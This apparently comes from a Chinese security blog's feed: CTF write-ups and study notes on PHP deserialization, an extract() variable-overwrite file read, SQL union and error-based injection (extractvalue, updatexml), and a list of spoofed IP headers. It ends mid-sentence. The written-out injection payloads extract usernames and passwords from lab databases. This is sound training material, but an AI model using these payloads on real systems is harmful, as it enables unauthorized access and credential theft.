被反序列化（触发调用条件），魔术方法__wakeup()被自动调用。</p><p>所以，要让链子依次调用魔术方法，那么<u>上一个对象</u>为上一个目标魔术方法所在的类的对象，<u>上一个对象的属性</u>为下一个目标魔术方法所在的类的对象，从而将一个个魔术方法链接起来。<u>形象地讲就是对象按对应魔术方法的调用顺序依次套娃。</u></p><blockquote><p>Tips:<br>因为我花了不少功夫才大致搞明白，所以写的比较详细且啰嗦，光看太绕了，最好结合前面 CBCTF2024 Notes2 调试时的变量结构图理解，调试一遍看一下。</p></blockquote><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p><a href="https://xz.aliyun.com/news/11953">https://xz.aliyun.com/news/11953</a></p><p><a href="https://cloud.tencent.com/developer/article/1945248">https://cloud.tencent.com/developer/article/1945248</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CBCTF2024 WP</title>
    <link href="/2025/01/24/CBCTF2024/"/>
    <url>/2025/01/24/CBCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="CBCTF2024-WP"><a href="#CBCTF2024-WP" class="headerlink" title="CBCTF2024 WP"></a>CBCTF2024 WP</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1-SignIn"><a href="#1-SignIn" class="headerlink" title="1.SignIn"></a>1.SignIn</h2><p><img src="/img/CBCTF2024/1.png"></p><p>主要是 get 传参 a、b，参数本身的值不等，md5 的结果强比较相等，结合提示的置顶帖子即可。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak<br>&amp;<span class="hljs-attribute">b</span>=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak<br></code></pre></td></tr></table></figure><p>得到答案。</p><h2 id="2-Notes-1"><a href="#2-Notes-1" class="headerlink" title="2.Notes 1"></a>2.Notes 1</h2><p>一开始以为是路径穿越的题。</p><p>URL 尝试 <code>/notes_read.php?file=note3.txt</code> 时发现返回 <code>Error: File not found : /var/www/html/note3.txt</code> 也就得知访问的根目录在 <code>/var/www/html/</code>，通过 <code>/notes_read.php?file=...</code></p><p>传参读取该目录下的文件，因此访问 URL <code>/notes_read.php?file=notes_read.php</code> 就可以看到 notes_read.php 的源码。</p><p><img src="/img/CBCTF2024/2.png"></p><p>读完代码发现对于参数 <code>$file</code> 存在正则匹配，且实际读取文件的路径 <code>$filePath</code> 由 <code>$notes_directory</code> 和 <code>$file</code> 拼接而成，无法直接获取 <code>/flag</code>。而后发现 <code>extract()</code> 存在变量覆盖漏洞，所以传参 <code>/notes_read.php?file=flag&amp;notes_directory=/</code> 将变量 <code>$notes_directory</code> 的原内容覆盖，再拼接后即为&#x2F;flag 路径，读取到 flag。</p><h2 id="3-Notes-2"><a href="#3-Notes-2" class="headerlink" title="3.Notes 2"></a>3.Notes 2</h2><p>未完成</p><p>已有思路是反序列化后 <code>_0rays</code> 类下的 <code>__wakeup()</code> 先自动调用，而后 <code>__toString()</code>，<code>__set($a, $b)</code>，<code>__get($c)</code>，<code>__invoke()</code>，<code>__construct($filepath)</code>，最终 <code>readfile($filepath);</code> 获取 flag</p><p>但是实践起来还不熟练，没有做完。</p><p><img src="/img/CBCTF2024/3.png"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><h2 id="阳光长跑"><a href="#阳光长跑" class="headerlink" title="阳光长跑"></a>阳光长跑</h2><p>补做了阳光长跑一题，主要考点是前后端的通信交互，用BP抓包发现开始跑步后浏览器向后端发送位置（经纬度）信息，推测后端根据位置信息的变化距离判断跑步长度，跑步时长由后端计算后返回，不受前端影响。</p><p>所以通过BP改变位置信息使距离达到要求然后再等时长到达合适的时间即可。</p><h2 id="Notes-2"><a href="#Notes-2" class="headerlink" title="Notes 2"></a>Notes 2</h2><p>该题为基础 PHP 反序列化，思路同上所述，具体参考我的另一篇博文<a href="https://5i1encee.top/2025/02/01/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E7%BB%93">PHP反序列化小结</a></p><p><a href="https://0rays-club.feishu.cn/wiki/SoYjwHDSGixa12kk1RYcKQHKnpd">官方WP</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>WriteUp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL 爆库名表名列名数据小结</title>
    <link href="/2024/09/07/SQL%E7%88%86%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE%E5%B0%8F%E7%BB%93/"/>
    <url>/2024/09/07/SQL%E7%88%86%E5%BA%93%E5%90%8D%E8%A1%A8%E5%90%8D%E5%88%97%E5%90%8D%E6%95%B0%E6%8D%AE%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-爆库名表名列名数据小结"><a href="#SQL-爆库名表名列名数据小结" class="headerlink" title="SQL 爆库名表名列名数据小结"></a>SQL 爆库名表名列名数据小结</h1><p>本篇以 BUUCTF-[极客大挑战 2019]BabySQL 1 为例，但不涉及该题详细内容</p><p>题中涉及到双写绕过关键字过滤，在以下不做考虑，仅借用本题场景</p><p>1.通过 <code>order by</code> 判断得出数据表为 3 列，并测试得回显 2、3</p><p>2.获取所有库名 <code>1&#39; union select 1,database(),group_concat(schema_name) from information_schema.schemata #</code> 得到 geek 以及 information_schema,mysql,performance_schema,test,ctf,geek</p><p>3.获取 geek 库中的表名 <code>1&#39; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39; #</code> 得到 b4bsql,geekuser</p><p>4.获取 geekuser 中的列名 <code>1&#39; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#39;geekuser&#39; #</code> 得到 id,username,password</p><p>5.获取数据 <code>1&#39; union select 1,2,group_concat(concat_ws(0x7e,username,password)) from geek.geekuser #</code> 其中 <code>concat_ws()</code> 函数的功能是指定参数之间的分隔符，<code>0x7e</code> 即为 <code>~</code>，非必须，from 后的格式为“库名.表名”</p><p>参考：<a href="https://www.cnblogs.com/xiaobai141/p/14160758.html">https://www.cnblogs.com/xiaobai141/p/14160758.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL 学习笔记</title>
    <link href="/2024/09/07/SQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/09/07/SQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL-学习笔记"><a href="#SQL-学习笔记" class="headerlink" title="SQL 学习笔记"></a>SQL 学习笔记</h1><h1 id="SQL-学习笔记-1"><a href="#SQL-学习笔记-1" class="headerlink" title="SQL 学习笔记"></a>SQL 学习笔记</h1><p>本篇笔记内容与 B 站课程 <a href="https://www.bilibili.com/video/BV1c34y1h7So?spm_id_from=333.1245.0.0">SQL 注入由简入精</a>基本一致，为知识点和个人心得总结。</p><h1 id="sqli-labs-靶场搭建"><a href="#sqli-labs-靶场搭建" class="headerlink" title="sqli-labs 靶场搭建"></a>sqli-labs 靶场搭建</h1><ol><li>下载 phpstudy</li><li>github 上下载 sqli-labs 环境复制到 phpstudy 根目录下</li></ol><h1 id="SQL-基础常用语法语句"><a href="#SQL-基础常用语法语句" class="headerlink" title="SQL 基础常用语法语句"></a>SQL 基础常用语法语句</h1><h2 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h2><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p><code>show databases;</code></p><p>（根目录下输入）查看数据库</p><p><code>create database employees charset utf8;</code></p><p>创建数据库 employees 并选择字符集</p><p><code>drop database employees;</code></p><p>删除数据库 employees</p><p><code>use employees;</code></p><p>选择进入数据库 employees</p><h3 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> employee<br>(<br>id <span class="hljs-type">int</span>,<br><span class="hljs-type">name</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">40</span>),<br>sex <span class="hljs-type">char</span>(<span class="hljs-number">4</span>),<br>birthday data,<br>job <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>)<br>);<br></code></pre></td></tr></table></figure><p>创建数据表 employee，必须设定列</p><p><code>drop table employee;</code></p><p>删除数据表</p><p><code>rename table employee to user;</code></p><p>修改数据表名称为 user</p><p><code>alter table user character set utf8;</code></p><p>修改字符集</p><h3 id="数据列和数据行"><a href="#数据列和数据行" class="headerlink" title="数据列和数据行"></a>数据列和数据行</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">user</span><br>(<br>    id,<span class="hljs-type">name</span>,sex,birthday,job)<br><span class="hljs-keyword">values</span><br>(<br>    <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;ctfstu&#x27;</span>,<span class="hljs-string">&#x27;male&#x27;</span>,<span class="hljs-string">&#x27;1999-05-06&#x27;</span>,<span class="hljs-string">&#x27;IT&#x27;</span>)<br>;<br></code></pre></td></tr></table></figure><p>写入内容</p><p><code>alter table user add salary decimal(8,2);</code></p><p>增加一列内容 salary，最大 8 位，小数点后保留 2 位</p><p><code>update user set salary=5000;</code></p><p>修改所有工资为 5000</p><p><code>update user set name=&#39;benben&#39; where id=1;</code></p><p>修改 id&#x3D;1 的行 name 为 benben</p><p><code>update user set name=&#39;benben2&#39;,salary=3000 where id=1;</code></p><p>修改 id&#x3D;1 的行 name 为 benben2，工资为 3000</p><p><code>alter table user drop salary;</code></p><p>删除指定列</p><p><code>delete from user where job=&#39;IT&#39;;</code></p><p>删除指定行</p><p><code>delete from user;</code></p><p>删除表中所有数据（不删除表的结构）</p><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>基础查询词：</p><p><code>select</code>，<code>from</code>，<code>where</code></p><p>查询参数指令：</p><p><code>union</code>，<code>group by</code>，<code>order by</code>，<code>limit</code>，<code>and</code>，<code>or</code></p><p>常用函数：</p><p><code>group_concat()</code>，<code>database()</code>，<code>version()</code></p><h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><p><code>select * from user where id=1;</code></p><p>select+ 列名（*代表所有）+from+ 表名（user）+where+ 条件语句（id&#x3D;1）+;</p><p><code>select * from user where id in (&#39;1&#39;);</code></p><p>在 user 表中查询所有包含 id 为 1 的数据</p><p><code>select * from user where id=(select id from user where username=(&#39;admin&#39;));</code></p><p>子查询，优先执行()内语句</p><h3 id="查询参数指令"><a href="#查询参数指令" class="headerlink" title="查询参数指令"></a>查询参数指令</h3><h4 id="union"><a href="#union" class="headerlink" title="union"></a>union</h4><p><code>select id from user union select email_id from emails;</code></p><p>查询并合并数据显示</p><p><code>select * from user where id=6 union select * from emails where id=6;</code>（错误示例）</p><p>返回 <code>ERROR: have a different number of columns</code> 联合注入 union 左右表格列数必须相等，此例 user 有 3 列，emails 有 2 列</p><p><code>select * from user where id=6 union select *,3 from emails where id=6;</code>（正确示例）</p><p>由于 union 右比左少一列，因此用 3 作为填充列，使左右列数相等，查询结果 emails 部分第三列数据即为 3</p><h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><p>本身实现的是分组功能但也可用于判断列数。由于存在一些问题不推荐常用，例如：user 表中有两条相同姓名不同 id 的数据，只对一列分组可以，对多列分组会报错。一些防火墙过滤可能不严格，可以方便利用。</p><p><code>select username from user group by username;</code></p><p>在 user 表中查询 username 列，按 username 分组输出</p><p><code>select username from user group by 1;</code></p><p>同上输出，username 仅一列，本句查询按第一列分组</p><p><code>select username from user group by 2;</code></p><p>报错，username 仅一列，本句查询按第二列分组，不存在第二列</p><p><code>select * from user group by 2;</code></p><p>正常输出，user 表三列数据，按 user 表内第二列分组。</p><p>想要判断列数则可以根据以上原理从 2 开始 3、4、5······往后尝试，当出现报错时的数-1 即为列数</p><p>实际 SQL 注入时使用二分法，先取一个足够大会返回报错的数，而后不断取半（中间数），直到找到边界。</p><p>例如 <code>select * from user where id=1 group by 10;</code> 10-&gt;5-&gt;3-&gt;4</p><h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p>本身实现的是排序，同 group by 可用于判断列数</p><p><code>select * from user order by id;</code></p><p>在 user 表中按 id 升序排序</p><p><code>select * from user where username=&#39;Xiao Ming&#39; order by id;</code></p><p>可在 order by 前加入 where 条件</p><p><code>select * from user where username=&#39;Xiao Ming&#39; order by id desc;</code></p><p>order by 的排序默认升序，在后面加 desc 改为降序</p><p><code>select * from user order by 1;</code></p><p>同 group by 一样可按第几列排序，判断列数方法同样相似</p><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>限制输出内容数量，一般用于报错注入，限数显示报错反馈信息</p><p><code>select * from user limit 0,3;</code></p><p>限制为从第 1 行开始显示 3 行，在这里实际的第一行就是命令里的第 0 行</p><p>当回显内容有限想查看同一级其他数据时可以在语句后加上 <code>limit 0,1</code>，<code>limit1,1</code>，<code>limit2,1</code> 等等</p><h4 id="and-or"><a href="#and-or" class="headerlink" title="and &amp; or"></a>and &amp; or</h4><p>即“与”和“或”。额算是比较重要但也没什么好说的。</p><h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><h4 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h4><p>将多行合并拼接至一行显示（并用指定分隔符分隔），在 union 注入及报错注入时 group_concat 尤为重要</p><p><code>select group_concat(id,username,password) from user;</code></p><p>将 user 表内的 id，username，password 合并在一行输出</p><p>当遇到限制回显数量只有一条时，就可以用 <code>group_concat()</code> 较方便的一次性获得所有内容，例如 <code>group_concat(table_name)</code>，比 <code>limit</code> 一条一条查更方便。但是如果源码当中显示位数设置较少的话这种方法就可能导致显示不全，用 <code>limit</code> 则更加稳妥</p><h4 id="concat"><a href="#concat" class="headerlink" title="concat()"></a>concat()</h4><p>效果与 group_concat()类似，是将任意长度的多个字符串拼接成一个字符串，在报错注入时也是尤为重要</p><h4 id="select-database"><a href="#select-database" class="headerlink" title="select database()"></a>select database()</h4><p>查看当前数据库名称</p><h4 id="select-version"><a href="#select-version" class="headerlink" title="select version()"></a>select version()</h4><p>查看当前数据库版本，防火墙绕过时用得到，方便找到对应版本的漏洞</p><h1 id="SQL-注入基础"><a href="#SQL-注入基础" class="headerlink" title="SQL 注入基础"></a>SQL 注入基础</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>SQL 注入就是通过构造一条精巧的 SQL 命令语句来查询得到想要的信息。</p><p>注入点即可以实现输入的地方，通常是一个访问数据库的连接。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>按查询字段分：</p><p>数字型，输入参数为整型</p><p>字符型，输入参数为字符串（被单引号闭合）</p><p>按注入方法分：<br>union 注入、报错注入、布尔注入、时间注入</p><h2 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h2><h3 id="数字型-or-字符型？"><a href="#数字型-or-字符型？" class="headerlink" title="数字型 or 字符型？"></a>数字型 or 字符型？</h3><p>数字型提交内容一般为数字，但<u>数字不一定是数字型</u>，<u>数字型不需要闭合符来闭合</u></p><p>字符型提交内容则需要<u>闭合符闭合</u></p><p>1.使用 <code>and 1=1</code> 和 <code>and 1=2</code> 来判断</p><p>如果为数字型，前者照常显示返回信息，后者不会显示，因为 1 与 2 不等</p><p>如果为字符型，两者都能正常显示信息，相当于输入内容均被单引号包裹，and 不作为命令执行</p><p>2.使用(?id)<code>=2-1</code> 来判断</p><p>如果为数字型则返回的是 <code>?id=1</code> 的内容</p><p>如果为字符型则无法计算，返回为 <code>?id=2</code> 的内容</p><p>不推荐用 <code>+</code>，因为 URL 编码通常用 <code>+</code> 和 <code>%20</code> 代替空格，解码时相应会被解码成空格</p><h3 id="若字符型则闭合方式？"><a href="#若字符型则闭合方式？" class="headerlink" title="若字符型则闭合方式？"></a>若字符型则闭合方式？</h3><p>常见闭合方式：</p><p><code>&#39;</code>、<code>&quot;</code>、<code>&#39;)</code>、<code>&quot;)</code>、其他</p><p>1.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&#39;......</code>，多了一个 <code>&#39;</code> 则闭合符为 <code>&#39;</code></p><p>2.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&quot;......</code>，多了一个 <code>&quot;</code> 则闭合符为 <code>&quot;</code></p><p>3.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&#39;)......</code>，多了一个 <code>&#39;)</code> 则闭合符为 <code>&#39;)</code></p><p>4.输入 <code>?id=1&#39;&quot;</code>，报错为 <code>......near 1&#39;&quot;&quot;)......</code>，多了一个 <code>&quot;)</code> 则闭合符为 <code>&quot;)</code></p><p>即尝试输入内容中的闭合符与输入内容前的闭合符闭合，输入内容后原本的闭合符则会变得多余，从而报错，我们根据报错得到命令当中所用的闭合符</p><p>闭合的作用：</p><p>结束前一段查询语句，在后面可加入其他语句，查询需要的参数</p><p>后面不需要的语句可以用注释符 <code>--+</code>（此处跟的 <code>+</code> 实际是代替空格，避免直接输入空格被忽略，也可以通过在空格后随便加上一些内容避免这个问题，例如 <code>-- abc</code>）、<code>#</code>、<code>%23</code> 注释掉</p><h2 id="union-联合注入"><a href="#union-联合注入" class="headerlink" title="union 联合注入"></a>union 联合注入</h2><p>用二分法判断默认页面数据列数量，参考前面的 union、group by、order by 内容，再使用联合注入获得目标结果</p><p>但是页面只能显示一个内容，union 后的语句查询的内容是不显示的，因此为了显示想要的内容，可以将前一句查询的内容改为数据库中原本不存在的数据，如 <code>id=-1</code>，那么前面一句查询不到结果就只会显示后面一句查询的结果</p><p>此外并非每一列的内容都会回显，要先判断会回显的是哪些列。例如 sqli-labs 的 less-1，注入 <code>?id=-1&#39; union select 1,2,3--+</code>，会回显的是 2、3，因此我们可以二三两列位置换成其他想要的内容，例如 <code>?id=-1&#39; union select 1,version(),database()--+</code></p><p>注入步骤：</p><p>1.查找注入点</p><p>2.判断字符型还是数字型</p><p>3.若是字符型则找到其闭合方式</p><p>4.判断查询列数 group by&#x2F;order by</p><p>5.查询回显位置</p><p>而后可参考这篇小结查询所需信息</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>有时尝试 union 联合注入发现语句正确但无对应回显，而输入错误语句时仍会有报错回显，那么就可以尝试报错注入</p><p>报错注入的基础是后台对于输入输出的合理性未做检测</p><p>报错注入的实现就是构造语句让错误语句中夹杂可以显示数据库内容的查询语句，使得返回的报错提示中包含数据库中的内容</p><h3 id="extractvalue-报错注入"><a href="#extractvalue-报错注入" class="headerlink" title="extractvalue()报错注入"></a>extractvalue()报错注入</h3><p>extractvalue()函数包含两个参数：XML 文档对象名称、路径</p><p>根据以下例子了解该函数用法</p><p>1、先在 ctfstu 数据库内创建表 xml</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database ctfstu charset utf8;<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> xml(doc <span class="hljs-type">varchar</span>(<span class="hljs-number">150</span>));<br></code></pre></td></tr></table></figure><p>2、在表内插入两段数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> xml <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;book&gt;</span><br><span class="hljs-string">&lt;title&gt;A bad boy how to get a</span><br><span class="hljs-string">girlfriend&lt;/title&gt;</span><br><span class="hljs-string">&lt;author&gt;</span><br><span class="hljs-string">&lt;initial&gt;Love&lt;/initial&gt;</span><br><span class="hljs-string">&lt;surname&gt;benben&lt;/surname&gt;</span><br><span class="hljs-string">&lt;/author&gt;</span><br><span class="hljs-string">&lt;/book&gt;</span><br><span class="hljs-string">&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> xml <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;book&gt;</span><br><span class="hljs-string">&lt;title&gt;how to become a bad boy&lt;/title&gt;</span><br><span class="hljs-string">&lt;author&gt;</span><br><span class="hljs-string">&lt;initial&gt;hualong&lt;/initial&gt;</span><br><span class="hljs-string">&lt;surname&gt;Melton&lt;/surname&gt;</span><br><span class="hljs-string">&lt;/author&gt;</span><br><span class="hljs-string">&lt;/book&gt;</span><br><span class="hljs-string">&#x27;</span>);<br></code></pre></td></tr></table></figure><p>3、使用 extractValue()查询 xml 内的内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(doc,<span class="hljs-string">&#x27;/book/author/surname&#x27;</span>)<span class="hljs-keyword">from</span> xml;    #查询作者<br><br>返回：<br>benben<br>Melton<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(doc,<span class="hljs-string">&#x27;/book/title&#x27;</span>)<span class="hljs-keyword">from</span> xml;    #查询书名<br><br>返回：<br>A bad boy how <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> a girlfried<br>how <span class="hljs-keyword">to</span> become a bad boy<br></code></pre></td></tr></table></figure><p>4、写错查询参数中的路径</p><p>例如 <code>select extractvalue(doc,&#39;/book/titlelll&#39;)from xml;</code></p><p>结果查询不到内容但是也不会报错</p><p>5、写错查询参数的格式符号</p><p>例如 <code>select extractvalue(doc,&#39;~book/title&#39;)from xml;</code></p><p>显示报错信息 <code>#1105 - XPATH syntax error: &#39;~book/title&#39;</code></p><p>至此我们发现当写错查询参数的格式符号时会有报错返回，显示我们写错的路径。因此我们或许可以尝试在报错之前查询所需信息通过报错返回查看查询结果。</p><p>例如 <code>select extractvalue(doc,concat(0x7e,(select database()))) from xml;</code>，括号内的语句 <code>select database()</code> 优先执行，然后查询结果通过 <code>concat()</code> 函数与 <code>~</code> 符号拼接在一起作为 <code>extractvalue()</code> 函数的路径参数，最后因为格式不符规范，后台返回报错信息，而报错信息中包含“错误路径”也就是我们故意构造的查询语句的查询结果。至此，一次报错注入完成。想要查询其他内容只需要将相应的查询语句替换进 <code>select database()</code> 所在位置。</p><p>实际在运用这种报错注入时通过 <code>union select ......</code> 或者 <code>and 1=......</code> 注入均可，只要最终报错即可</p><p>例如 <code>?id=100&#39; and 1=extractvalue(1,concat(0x7e,(select group_concat(username,&#39;~&#39;,password) from users))) --+</code></p><p>然而报错注入还受到一个限制，<code>extractvalue()</code> 默认只能返回 32 个字符串，有时就会显示不全。对此的解决方法是运用 <code>substring(str,num1,num2)</code> 函数，其中 str 是操作的目标字符串，num1 是起始位置，num2 是截取个数，实现的效果就是显示字符串 str 从第 num1 位起 num2 个字符长度的字符串</p><p>例如 <code>?id=100&#39; and 1=extractvalue(1,concat(0x7e,(select substring(group_concat(username,&#39;~&#39;,password),25,30) from users))) --+</code></p><h3 id="updatexml-报错注入"><a href="#updatexml-报错注入" class="headerlink" title="updatexml()报错注入"></a>updatexml()报错注入</h3><p>updatexml()函数包含三个参数：XML 文档对象名称、路径、要替换的新数据</p><p>该函数的功能就是更新替换 XML 文档中的指定内容</p><p>该函数的报错原理与 extractvalue()一样，输入带错误符号的第二个参数。该函数也同样存在 32 位的限制，同样参考 extractvalue()用 substring()解决</p><h3 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h3>]]></content>
    
    
    <categories>
      
      <category>Note&amp;Summary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hgame2024 WP</title>
    <link href="/2024/07/03/Hgame2024/"/>
    <url>/2024/07/03/Hgame2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Hgame2024-WP"><a href="#Hgame2024-WP" class="headerlink" title="Hgame2024 WP"></a>Hgame2024 WP</h1><h1 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="1-Bypass-it"><a href="#1-Bypass-it" class="headerlink" title="1.Bypass it"></a>1.Bypass it</h3><p>一开始想偏了，以为要绕过别的什么，但其实就是绕过对注册的阻止就行，查看html，可以看到注册相关的页面地址。</p><p><img src="/img/Hgame2024/Week1/1.png"></p><p><img src="/img/Hgame2024/Week1/2.png" alt="register_page.php"></p><p>然后直接向register.php传参就好了<code>username=1&amp;password=1&amp;register=注册</code>。然后登录。</p><h3 id="2-ezHTTP"><a href="#2-ezHTTP" class="headerlink" title="2.ezHTTP"></a>2.ezHTTP</h3><p>先是“请从vidar.club访问这个页面”，<code>Referer=vidar.club</code>即可</p><p>再是“请通过Mozilla&#x2F;5.0 (Vidar; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;121.0.0.0 Safari&#x2F;537.36 Edg&#x2F;121.0.0.0访问此页面”，<code>User Agent=Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</code>即可</p><p>然后“请从本地访问这个页面”，我第一个想到的是<code>X-Forwarded-For</code>，但是没反应，发现响应头里有提示“Hint：Not XFF”，所以需要更换其他等效的字段，最终<code>X-Real-IP: 127.0.0.1</code>可以发挥作用。这里附上所有起类似作用的语句（在博客园一篇博客上找到的，忘记具体出处了）</p><pre><code class="hljs">Client-IP:127.0.0.1Forwarded-For-Ip: 127.0.0.1Forwarded-For: 127.0.0.1Forwarded-For: localhostForwarded:127.0.0.1Forwarded: localhostTrue-Client-IP:127.0.0.1X-Client-IP: 127.0.0.1X-Custom-IP-Authorization : 127.0.0.1X-Forward-For: 127.0.0.1X-Forward: 127.0.0.1X-Forward: localhostX-Forwarded-By:127.0.0.1X-Forwarded-By: localhostX-Forwarded-For-Original: 127.0.0.1X-Forwarded-For-original: localhostX-Forwarded-For: 127.0.0.1X-Forwarded-For: localhostX-Forwarded-Server: 127.0.0.1X-Forwarded-Server: localhostX-Forwarded: 127.0.0.1X-Forwarded: localhostX-Forwared-Host: 127.0.0.1X-Forwared-Host: localhostX-Host: 127.0.0.1X-Host: localhostX-HTTP-Host-Override : 127.0.0.1X-Originating-IP: 127.0.0.1X-Real-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1X-Remote-Addr : localhostX-Remote-IP: 127.0.0.1</code></pre><p>于是“Ok, the flag has been given to you ^-^”，去看响应头发现有“Authorization”，将JWT放到<a href="https://jwt.io/">https://jwt.io/</a>解密即可。</p><h3 id="3-Select-Courses"><a href="#3-Select-Courses" class="headerlink" title="3.Select Courses"></a>3.Select Courses</h3><p>这题我当时没做出来，就放一个官方题解记录一下：</p><hr><p>题⽬主要考察的是选⼿编写脚本的能⼒。</p><p>帮助阿菇选到所有课程，即可获取FLAG。后端逻辑是每间隔 30s-180s 放出⼀⻔课，若 5s 